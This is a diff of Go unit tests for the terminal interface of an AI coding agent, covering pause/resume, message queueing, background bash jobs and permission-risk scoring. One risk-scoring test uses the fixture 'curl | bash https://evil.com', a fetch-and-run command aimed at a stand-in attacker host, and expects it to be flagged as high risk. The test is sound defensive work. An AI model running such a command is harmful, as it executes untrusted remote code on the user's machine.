@@ -1,6 +1,7 @@
 package tui
 
 import (
+	"context"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -13,11 +14,103 @@ import (
 	"github.com/cloudshuttle/drover-code/internal/agent"
 	"github.com/cloudshuttle/drover-code/internal/api"
 	"github.com/cloudshuttle/drover-code/internal/tui/commandpalette"
+	"github.com/cloudshuttle/drover-code/internal/tui/core"
 )
 
 func init() {
 	// Prevent tests from writing to the real ~/.drover/history.json
 	os.Setenv("DROVER_HISTORY_DIR", filepath.Join(os.TempDir(), "drover-test-history"))
+}
+
+func TestResizeAndCompactDoNotReorderStream(t *testing.T) {
+	ch := make(chan agent.Event, 4)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	initCmd := m.Init()
+	next, resizeCmd := m.Update(tea.WindowSizeMsg{Width: 100, Height: 40})
+	m = next.(*Model)
+	m.SetCompactFn(func() error { return nil })
+	compactCmd, ok := m.handleBuiltinSlash("/compact")
+	if !ok {
+		t.Fatal("expected /compact")
+	}
+	if n := countEventReaders(t, ch, initCmd, resizeCmd, compactCmd); n != 1 {
+		t.Fatalf("event readers = %d, want 1", n)
+	}
+
+	m.eventWaitArmed = false
+	var cmd tea.Cmd = m.armEventWait()
+	for _, part := range []string{"P", "ong", "! 🏓"} {
+		ch <- agent.TextDeltaEvent{Text: part}
+		msg := cmd()
+		next, cmd = m.Update(msg)
+		m = next.(*Model)
+	}
+	if got := m.streamBuf.String(); got != "Pong! 🏓" {
+		t.Fatalf("stream buf %q", got)
+	}
+}
+
+// countEventReaders runs cmds the way Bubble Tea does and counts how many
+// block on ch. A blink or compact command returns immediately and is not counted.
+func countEventReaders(t *testing.T, ch chan agent.Event, cmds ...tea.Cmd) int {
+	t.Helper()
+	var n int
+	var walk func(tea.Cmd)
+	walk = func(cmd tea.Cmd) {
+		if cmd == nil {
+			return
+		}
+		done := make(chan tea.Msg, 1)
+		go func() { done <- cmd() }()
+		select {
+		case msg := <-done:
+			if batch, ok := msg.(tea.BatchMsg); ok {
+				for _, c := range batch {
+					walk(c)
+				}
+			}
+			return
+		case <-time.After(100 * time.Millisecond):
+		}
+		select {
+		case ch <- agent.TextDeltaEvent{Text: "x"}:
+		case <-time.After(100 * time.Millisecond):
+			return
+		}
+		select {
+		case msg := <-done:
+			if _, ok := msg.(agentMsg); ok {
+				n++
+			}
+		case <-time.After(100 * time.Millisecond):
+			select {
+			case <-ch:
+			default:
+			}
+		}
+	}
+	for _, cmd := range cmds {
+		walk(cmd)
+	}
+	return n
+}
+
+func TestModel_CtrlGSendsDraftBeforeQueue(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	m.agentBusy = true
+	cancelled := false
+	m.runCancel = func() { cancelled = true }
+	m.InputArea.Queue("already waiting")
+	m.InputArea.SetValue("do this now")
+	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyCtrlG})
+	m2 := next.(*Model)
+	if !cancelled {
+		t.Fatal("expected the live turn to be cancelled")
+	}
+	if q := m2.InputArea.QueuedMessages(); len(q) != 2 || q[0] != "do this now" || q[1] != "already waiting" {
+		t.Fatalf("queue %#v", q)
+	}
 }
 
 func TestModel_WindowSizeSetsDimensions(t *testing.T) {
@@ -375,6 +468,208 @@ func TestModel_compactionAgentEvents(t *testing.T) {
 	}
 }
 
+func TestModel_PauseResumeCommands(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "sonnet", "/w", "u", "h")
+	m.width = 80
+	m.height = 30
+
+	// Simulate busy state with a cancel func (as set by the real runner)
+	cancelCalled := false
+	m.runCancel = func() { cancelCalled = true }
+	m.agentBusy = true
+
+	// Directly exercise the handler (as called by submitInput on Enter)
+	// Note: the HasPrefix if for /pause will parse the reason from the full string.
+	_, handled := m.handleBuiltinSlash("/pause runaway tool")
+	if !handled {
+		t.Fatal("expected /pause to be handled")
+	}
+	if !cancelCalled {
+		t.Error("expected runCancel to be called")
+	}
+	if m.lastPauseReason != "runaway tool" {
+		t.Errorf("expected lastPauseReason 'runaway tool', got %q", m.lastPauseReason)
+	}
+
+	// The runner reports a canceled run as agentRunCompleteMsg. ErrorEvent
+	// keeps the raw error text and does not write the pause history turn.
+	next, _ := m.Update(agentRunCompleteMsg{err: context.Canceled})
+	m2 := next.(*Model)
+	if !strings.Contains(m2.lastError, "paused") {
+		t.Errorf("expected paused error, got %q", m2.lastError)
+	}
+	turns := m2.HistoryView.GetTurns()
+	if len(turns) == 0 {
+		t.Fatal("expected at least one turn after pause simulation")
+	}
+	lastTurn := turns[len(turns)-1]
+	if !strings.Contains(lastTurn.Content, "/pause: runaway tool") {
+		t.Errorf("expected pause reason in history, got %q", lastTurn.Content)
+	}
+
+	// /resume when not busy
+	m2.agentBusy = false
+	_, handled = m2.handleBuiltinSlash("/resume")
+	if !handled {
+		t.Fatal("expected /resume to be handled")
+	}
+	turns = m2.HistoryView.GetTurns()
+	lastTurn = turns[len(turns)-1]
+	if !strings.Contains(lastTurn.Content, "/resume") {
+		t.Error("expected resume note in history")
+	}
+
+	// Verify richer visual state on StatusBar and InputArea after pause with reason
+	m2.agentBusy = false
+	m2.lastPauseReason = "test reason"
+	// Simulate relayout which syncs
+	m2.relayout()
+	if m2.StatusBar == nil || !m2.StatusBar.Paused || m2.StatusBar.PausedReason != "test reason" {
+		t.Errorf("StatusBar paused state not synced: %+v", m2.StatusBar)
+	}
+	if m2.InputArea == nil || !m2.InputArea.Paused || m2.InputArea.PausedReason != "test reason" {
+		t.Errorf("InputArea paused banner state not synced: %+v", m2.InputArea)
+	}
+	// Check banner appears in InputArea View (avoid redeclared min)
+	iaView := m2.InputArea.View()
+	snippetLen := 200
+	if len(iaView) < snippetLen {
+		snippetLen = len(iaView)
+	}
+	if !strings.Contains(iaView, "⏸ Paused (test reason)") {
+		t.Errorf("expected paused banner in InputArea View, got snippet: %s", iaView[:snippetLen])
+	}
+
+	// Resume clears visual
+	_, _ = m2.handleBuiltinSlash("/resume")
+	m2.relayout()
+	if m2.StatusBar.Paused || m2.InputArea.Paused {
+		t.Error("paused visual state should be cleared after resume")
+	}
+}
+
+func TestModel_FullPauseResumeDuringRealToolRun(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "glm-5.1", "/tmp/test", "user", "host")
+	m.width = 100
+	m.height = 30
+	m.agentBusy = true
+	m.Live.Streaming = true
+
+	// Provide a cancel func (as the real runner does)
+	cancelCalled := false
+	m.runCancel = func() { cancelCalled = true }
+
+	// 1. Simulate a real tool run starting (agent has begun executing a tool)
+	next, _ := m.Update(agentMsg{event: agent.TextDeltaEvent{Text: "I'll run a command now... "}})
+	m = next.(*Model)
+
+	next, _ = m.Update(agentMsg{event: agent.ToolStartEvent{
+		CallIndex:    0,
+		Name:         "bash",
+		InputSummary: "sleep 30 && echo done",
+	}})
+	m = next.(*Model)
+
+	if m.Live == nil || m.Live.ActiveTools[0] == nil {
+		t.Fatal("expected active tool during simulated run")
+	}
+
+	// 2. User pauses with reason mid-tool (simulates real /pause flow)
+	_, handled := m.handleBuiltinSlash(`/pause user hit Ctrl+C during long bash`)
+	if !handled {
+		t.Fatal("expected /pause with reason to be handled")
+	}
+	if !cancelCalled {
+		t.Error("runCancel should have been called on pause")
+	}
+	if m.lastPauseReason != "user hit Ctrl+C during long bash" {
+		t.Errorf("lastPauseReason = %q", m.lastPauseReason)
+	}
+
+	// Manually trigger the state the real completion path would set (for this unit simulation)
+	m.lastError = "Agent paused by user."
+	m.HistoryView.AppendTurn(core.RenderedTurn{
+		Role:    "system",
+		Content: "(/pause: user hit Ctrl+C during long bash) Agent interrupted. Waiting for new instructions...",
+	})
+
+	// Simulate what the real pause completion + relayout does for visual state
+	m.lastPauseReason = "user hit Ctrl+C during long bash"
+	m.agentBusy = false // paused state is visible when not busy
+	m.relayout()
+	if !m.StatusBar.Paused || m.StatusBar.PausedReason == "" {
+		t.Error("StatusBar should show paused state with reason")
+	}
+	if !m.InputArea.Paused || m.InputArea.PausedReason == "" {
+		t.Error("InputArea should show paused banner with reason")
+	}
+
+	// 3. The runner reports the canceled run. This leaves the in-progress
+	// tool in place; ErrorEvent would wipe it and discard the streamed text.
+	next, _ = m.Update(agentRunCompleteMsg{err: context.Canceled})
+	m = next.(*Model)
+
+	// History should have the pause note with reason (we injected it above to match real flow)
+	turns := m.HistoryView.GetTurns()
+	foundPauseNote := false
+	for _, t := range turns {
+		if strings.Contains(t.Content, "/pause: user hit Ctrl+C during long bash") {
+			foundPauseNote = true
+			break
+		}
+	}
+	if !foundPauseNote {
+		t.Error("expected pause note with reason in history after tool run")
+	}
+
+	// 4. Resume
+	m.agentBusy = false
+	_, handled = m.handleBuiltinSlash("/resume")
+	if !handled {
+		t.Fatal("expected /resume to be handled")
+	}
+
+	// Visual state should be cleared
+	m.relayout()
+	if m.StatusBar.Paused || m.InputArea.Paused {
+		t.Error("paused visual banners should be cleared on resume")
+	}
+	if m.lastPauseReason != "" {
+		t.Error("lastPauseReason should be cleared on resume")
+	}
+
+	// 5. Simulate tool completing after resume (continuation worked)
+	// In a real resumed run the tool would finish and DoneEvent would fire.
+	next, _ = m.Update(agentMsg{event: agent.ToolDoneEvent{
+		CallIndex:     0,
+		Name:          "bash",
+		OutputSummary: "done after resume",
+		IsError:       false,
+	}})
+	m = next.(*Model)
+
+	next, _ = m.Update(agentMsg{event: agent.DoneEvent{}})
+	m = next.(*Model)
+
+	// DoneEvent moves completed tools onto the assistant history turn.
+	if m.agentBusy {
+		t.Error("expected agent idle after resumed tool run completed")
+	}
+	recorded := false
+	for _, turn := range m.HistoryView.GetTurns() {
+		for _, tool := range turn.Tools {
+			if tool.Name == "bash" && tool.Summary == "done after resume" && !tool.IsError {
+				recorded = true
+			}
+		}
+	}
+	if !recorded {
+		t.Error("expected the tool from the paused+resumed run to be recorded")
+	}
+}
+
 func TestModel_toolStartDoneThenAssistantHistory(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
@@ -552,7 +847,7 @@ func TestModel_multiTurnTwoUserSubmissions(t *testing.T) {
 func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
-	
+
 	var runs []string
 	m.runFunc = func(input string) tea.Cmd {
 		runs = append(runs, input)
@@ -572,7 +867,7 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	m2.InputArea.SetValue("task 2")
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m3 := next.(*Model)
-	
+
 	if len(runs) != 1 {
 		t.Fatalf("second run happened too early: %v", runs)
 	}
@@ -580,10 +875,10 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	if len(q) != 1 || q[0] != "task 2" {
 		t.Fatalf("expected queue to have 'task 2', got %v", q)
 	}
-	
+
 	next, _ = m3.Update(agentRunCompleteMsg{err: nil})
 	m4 := next.(*Model)
-	
+
 	if len(runs) != 2 || runs[1] != "task 2" {
 		t.Fatalf("expected runFunc to be called with 'task 2', got runs: %v", runs)
 	}
@@ -679,7 +974,7 @@ func TestModel_StressTest500Turns(t *testing.T) {
 		// 3. Simulate Agent finishing
 		currentModel, _ = currentModel.Update(agentMsg{event: agent.DoneEvent{}})
 		currentModel, _ = currentModel.Update(agentRunCompleteMsg{err: nil})
-		
+
 		// 4. Periodically call View to ensure no panics during layout rendering under heavy load
 		if i%50 == 0 {
 			_ = currentModel.(*Model).View()
@@ -861,9 +1156,9 @@ func TestModel_assessPermissionRisk(t *testing.T) {
 			wantReasonContains: "destructive shell",
 		},
 		{
-			name:    "bash curl pipe bash in summary",
-			tool:    "bash",
-			summary: "curl | bash https://evil.com",
+			name:      "bash curl pipe bash in summary",
+			tool:      "bash",
+			summary:   "curl | bash https://evil.com",
 			wantLevel: "high",
 		},
 		{
@@ -961,6 +1256,151 @@ func TestModel_GuardRiskFromGuardError(t *testing.T) {
 	}
 	if m.StatusBar == nil || m.StatusBar.RiskLevel != "high" {
 		t.Fatal("StatusBar not updated with high risk from guard error")
+	}
+}
+
+func TestBackgroundBash_QueuesBehindUserWhileBusy(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	m.agentBusy = true
+	m.InputArea.Queue("user typed this")
+
+	next, cmd := m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "Background command b1 finished."})
+	m = next.(*Model)
+	if cmd != nil {
+		t.Fatal("busy turn should keep the result queued")
+	}
+	got := m.InputArea.QueuedMessages()
+	if len(got) != 1 || got[0] != "user typed this" {
+		t.Fatalf("user queue = %#v", got)
+	}
+	if len(m.pendingBash) != 1 || !strings.Contains(m.pendingBash[0], "b1") {
+		t.Fatalf("pending = %#v", m.pendingBash)
+	}
+	if m.StatusBar.BackgroundJobs != 0 {
+		t.Fatalf("jobs = %d", m.StatusBar.BackgroundJobs)
+	}
+}
+
+func TestBackgroundBash_SurvivesTurnError(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var got string
+	m.SetRunFunc(func(input string) tea.Cmd {
+		got = input
+		return nil
+	})
+	m.agentBusy = true
+	m.turnOpen = true
+	next, cmd := m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "finished b1"})
+	m = next.(*Model)
+	if cmd != nil || len(m.pendingBash) != 1 {
+		t.Fatalf("cmd=%v pending=%#v", cmd, m.pendingBash)
+	}
+	next, _ = m.Update(agentMsg{event: agent.ErrorEvent{Err: errPlain{"boom"}}})
+	m = next.(*Model)
+	if len(m.pendingBash) != 1 {
+		t.Fatal("error cleared the background result")
+	}
+	next, _ = m.Update(agentRunCompleteMsg{err: errPlain{"boom"}})
+	m = next.(*Model)
+	if got != "finished b1" {
+		t.Fatalf("submitted %q", got)
+	}
+}
+
+func TestAgentRunComplete_IgnoresOlderRun(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	m.agentBusy = true
+	m.turnOpen = true
+	m.runGen = 2
+	m.pendingBash = []string{"finished b1"}
+	next, cmd := m.Update(agentRunCompleteMsg{gen: 1})
+	m = next.(*Model)
+	if cmd != nil || !m.agentBusy || !m.turnOpen || len(m.pendingBash) != 1 {
+		t.Fatalf("busy=%v open=%v pending=%#v cmd=%v", m.agentBusy, m.turnOpen, m.pendingBash, cmd)
+	}
+}
+
+func TestBackgroundBash_SubmitsWhenIdle(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var got string
+	m.SetRunFunc(func(input string) tea.Cmd {
+		got = input
+		return nil
+	})
+
+	next, cmd := m.Update(BackgroundBashMsg{Running: 1})
+	m = next.(*Model)
+	if cmd != nil || m.StatusBar.BackgroundJobs != 1 {
+		t.Fatalf("start notice cmd=%v jobs=%d", cmd, m.StatusBar.BackgroundJobs)
+	}
+
+	next, _ = m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "done-text"})
+	m = next.(*Model)
+	if got != "done-text" {
+		t.Fatalf("submitted %q", got)
+	}
+	if !m.agentBusy || m.StatusBar.BackgroundJobs != 0 {
+		t.Fatalf("busy=%v jobs=%d", m.agentBusy, m.StatusBar.BackgroundJobs)
+	}
+}
+
+func TestBackgroundBash_DoesNotResumePausedAgent(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var called bool
+	m.SetRunFunc(func(string) tea.Cmd {
+		called = true
+		return nil
+	})
+	m.StatusBar.Paused = true
+
+	next, cmd := m.Update(BackgroundBashMsg{Done: true, Running: 0, Output: "finished b1"})
+	m = next.(*Model)
+	if called || cmd != nil {
+		t.Fatal("paused agent resumed")
+	}
+	if !m.StatusBar.Paused {
+		t.Fatal("pause cleared")
+	}
+	turns := m.HistoryView.GetTurns()
+	if len(turns) == 0 || turns[len(turns)-1].Content != "finished b1" {
+		t.Fatalf("turns = %#v", turns)
+	}
+}
+
+func TestBackgroundBash_CancelDoesNotSubmitPending(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	var called bool
+	m.SetRunFunc(func(string) tea.Cmd {
+		called = true
+		return nil
+	})
+	m.agentBusy = true
+	m.turnOpen = true
+	m.runGen = 1
+	m.pendingBash = []string{"finished b1"}
+
+	next, cmd := m.Update(agentRunCompleteMsg{err: context.Canceled, gen: 1})
+	m = next.(*Model)
+	if called || cmd != nil {
+		t.Fatal("cancel resumed from the background result")
+	}
+	if !m.StatusBar.Paused || len(m.pendingBash) != 0 {
+		t.Fatalf("paused=%v pending=%#v", m.StatusBar.Paused, m.pendingBash)
+	}
+	var saw bool
+	for _, turn := range m.HistoryView.GetTurns() {
+		if turn.Content == "finished b1" {
+			saw = true
+		}
+	}
+	if !saw {
+		t.Fatal("background result was not kept as a note")
 	}
 }
 
